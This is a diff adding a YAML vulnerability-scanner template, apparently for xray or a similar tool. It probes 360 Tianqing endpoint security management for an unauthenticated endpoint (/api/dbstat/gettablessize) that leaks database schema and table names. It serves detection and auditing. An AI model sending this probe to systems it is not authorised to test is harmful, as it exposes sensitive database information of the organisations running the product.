@@ -1,0 +1,18 @@
+id: 360tianqing-gettablessize-database-info-leakage
+
+info:
+  name: 360天擎 gettablessize 数据库信息泄露漏洞
+  author: daffainfo,你是猪
+  severity: medium
+  verified: true
+  description: 360天擎 存在未授权越权访问，造成敏感信息泄露 title="360新天擎" app="360天擎终端安全管理系统"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/360%E5%A4%A9%E6%93%8E%20gettablessize%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/dbstat/gettablessize
+    expression: response.status == 200 && response.body.bcontains(b'"schema_name":') && response.body.bcontains(b'"reason":') && response.body.bcontains(b'"table_name":')
+expression: r0()
